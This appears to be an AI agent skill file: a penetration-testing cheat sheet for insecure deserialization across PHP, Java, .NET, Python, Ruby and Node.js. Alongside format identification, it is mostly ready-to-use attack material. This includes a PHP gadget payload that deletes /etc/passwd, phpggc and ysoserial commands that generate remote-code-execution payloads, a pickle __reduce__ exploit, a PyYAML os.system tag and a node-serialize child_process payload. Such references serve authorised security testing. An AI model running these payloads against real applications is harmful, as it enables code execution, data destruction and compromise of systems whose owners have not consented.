---
name: deserialization
description: Insecure deserialization for Java, PHP, Python, .NET, Ruby with gadget chains. Use for serialization testing.
---

# Insecure Deserialization

## Description
Serialization converts objects into a format for storage or transmission; deserialization reconstructs objects from that format. Insecure deserialization occurs when untrusted data is used to abuse application logic, deny service, or execute arbitrary code.

## Identification by Language

### PHP Serialized
```
# Magic bytes (Base64): Tz
# Magic bytes (Hex): 4F 3A

# Format indicators:
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}

# Types:
O: = Object
a: = Array
s: = String
i: = Integer
b: = Boolean
N; = Null
```

### Java Serialized
```
# Magic bytes (Base64): rO0
# Magic bytes (Hex): AC ED 00 05

# Often seen in:
- Cookies
- ViewState
- Java RMI
- HTTP request parameters
```

### .NET Serialized
```
# Magic bytes (Base64): /w
# Magic bytes (Hex): FF 01

# Common in:
- ViewState parameter
- .NET Remoting
- SOAP messages
```

### Python Pickle
```
# Magic bytes (Base64): gASV
# Magic bytes (Hex): 80 04 95

# Indicators:
- Opcodes like lp0, S'Test'
- Module references
```

### Ruby Marshal
```
# Magic bytes (Base64): BAgK
# Magic bytes (Hex): 04 08

# Look for \x04\x08 at start
```

## PHP Exploitation

### Object Injection
```php
// Vulnerable code
$user = unserialize($_COOKIE['user']);

// Exploit - if __wakeup() or __destruct() is vulnerable
O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}
```

### Magic Methods
```php
__construct()   // Called when object is created
__destruct()    // Called when object is destroyed
__wakeup()      // Called during unserialization
__sleep()       // Called during serialization
__toString()    // Called when object is treated as string
__call()        // Called when inaccessible method is invoked
__get()         // Called when inaccessible property is read
__set()         // Called when inaccessible property is written
```

### POP Chain (Property Oriented Programming)
```php
// Build a gadget chain using existing classes
class FileDelete {
    public $filename;
    function __destruct() {
        unlink($this->filename);
    }
}

// Payload to delete /etc/passwd
$payload = 'O:10:"FileDelete":1:{s:8:"filename";s:11:"/etc/passwd";}';
```

### Using phpggc
```bash
# https://github.com/ambionics/phpggc

# List available gadgets
phpggc -l

# Generate payload
phpggc Laravel/RCE1 system "id"

# Base64 encoded
phpggc Laravel/RCE1 system "id" -b

# For specific framework
phpggc Symfony/RCE4 exec "whoami"
phpggc WordPress/RCE1 system "id"
```

## Java Exploitation

### Using ysoserial
```bash
# https://github.com/frohoff/ysoserial

# List available payloads
java -jar ysoserial.jar

# Generate payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin

# Base64 encoded
java -jar ysoserial.jar CommonsCollections1 "id" | base64

# Common gadget chains:
# CommonsCollections1-7
# Jdk7u21
# Spring1
# Hibernate1
```

### Common Libraries for Gadgets
```
- Apache Commons Collections
- Spring Framework
- Hibernate
- Apache Xalan
- Jython
- Groovy
```

### Detection
```bash
# Check for Java serialized data
echo $DATA | base64 -d | xxd | head
# Look for: ac ed 00 05

# Or in Burp, look for rO0 prefix in Base64
```

## .NET Exploitation

### Using ysoserial.net
```bash
# https://github.com/pwntester/ysoserial.net

# List available gadgets
ysoserial.exe -l

# Generate payload
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc.exe"

# For ViewState
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --validationalg="SHA1" --validationkey="KEY"

# Common formatters:
# BinaryFormatter
# SoapFormatter
# ObjectStateFormatter
# LosFormatter
```

### ViewState Exploitation
```bash
# If ViewState not encrypted or MAC disabled
# Decode ViewState
echo $VIEWSTATE | base64 -d

# Generate malicious ViewState
ysoserial.exe -o base64 -g TypeConfuseDelegate -f LosFormatter -c "cmd /c whoami"
```

## Python Exploitation

### Pickle RCE
```python
import pickle
import os
import base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
```

### PyYAML RCE
```yaml
# If yaml.load() used without SafeLoader
!!python/object/apply:os.system ['id']

# Or
!!python/object/apply:subprocess.check_output [['id']]
```

## Ruby Exploitation

### Marshal RCE
```ruby
# Using Universal Deserialisation Gadget
require 'erb'

class Exploit
  def initialize
    @src = "<%= `id` %>"
    @filename = "exploit.erb"
  end
end

payload = Marshal.dump(Exploit.new)
```

### Using ysoserial-ruby
```bash
# Generate payload
ruby ysoserial-ruby.rb "id" > payload.bin
```

## Node.js Exploitation

### node-serialize RCE
```javascript
// Vulnerable: node-serialize package
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
```

### Payload Generator
```javascript
var y = {
    rce: function() {
        require('child_process').exec('id');
    }
};
var serialize = require('node-serialize');
console.log(serialize.serialize(y));
// Add () at end of function to auto-execute
```

## Testing Checklist

### Identification
- [ ] Look for serialized data in cookies, parameters, headers
- [ ] Check Base64-encoded data for magic bytes
- [ ] Identify the programming language/framework
- [ ] Look for common libraries that have gadget chains

### Exploitation
- [ ] Generate payloads with appropriate tool (ysoserial, phpggc)
- [ ] Test multiple gadget chains
- [ ] Try different serialization formats
- [ ] Check for blind command execution (DNS, HTTP callbacks)

### Verification
- [ ] Use out-of-band techniques (DNS, HTTP)
- [ ] Check for time delays
- [ ] Monitor for file creation/modification

## Tools Summary

| Language | Tool |
|----------|------|
| PHP | phpggc |
| Java | ysoserial |
| .NET | ysoserial.net |
| Python | Custom scripts |
| Ruby | ysoserial-ruby |
| Node.js | Custom scripts |

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
- https://portswigger.net/web-security/deserialization
- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
